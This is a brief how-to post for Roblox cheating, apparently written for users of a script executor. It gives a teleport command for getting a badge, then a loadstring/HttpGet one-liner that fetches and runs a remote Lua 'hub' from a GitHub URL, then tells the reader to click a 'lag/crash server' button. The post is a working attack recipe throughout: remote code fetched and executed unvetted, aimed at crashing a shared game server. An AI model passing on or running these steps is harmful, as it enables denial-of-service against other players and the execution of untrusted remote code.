First, execute this in your exploit: game:GetService("TeleportService"):Teleport(9844892482, LocalPlayer)
This is to get the badge needed for the sword.
Then rejoin the main game and execute this: loadstring(game:HttpGet(("https://raw.githubusercontent.com/dizyhvh/rbx_scripts/main/dizzy_hub/loader.lua")))();
Then wait for it to load, go to the misc tab, and click the "lag/crash server" button. And that's it!
(You need to move while doing so)
